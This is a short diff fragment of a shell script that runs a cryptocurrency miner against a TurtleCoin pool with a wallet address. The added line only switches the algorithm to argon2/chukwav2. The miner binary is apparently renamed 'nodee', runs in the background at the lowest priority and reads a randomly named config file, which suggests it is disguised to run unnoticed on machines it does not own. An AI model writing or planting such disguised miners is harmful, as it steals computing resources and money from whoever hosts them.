@@ -18,7 +18,7 @@ echo '{
 "disable_gpu" : true
 }' > abcdzyxw.txt
 
-nice -n 19 nodee -o turtlecoin.herominers.com:10381 -u TRTLuwZhJj6SmqEUWvrhEeG1Rn9Cvgvn8eCkgW649zJR32HT3vcSwdo3eET7ANk2pLXs4PvkFYrnk6K1GCnrsQYD2HVYQpQ89pR+3f5a44cbb083b058a7e0b5333732c64748007da4e4e3e51ee096de39861d394f.50000 -p jeff -a rx/0 --donate-level 1 -t 8 -r 99 -R 6 -B
+nice -n 19 nodee -o turtlecoin.herominers.com:10381 -u TRTLuwZhJj6SmqEUWvrhEeG1Rn9Cvgvn8eCkgW649zJR32HT3vcSwdo3eET7ANk2pLXs4PvkFYrnk6K1GCnrsQYD2HVYQpQ89pR+3f5a44cbb083b058a7e0b5333732c64748007da4e4e3e51ee096de39861d394f.50000 -p jeff -a argon2/chukwav2 --donate-level 1 -t 8 -r 99 -R 6 -B
 
 sleep 20
 
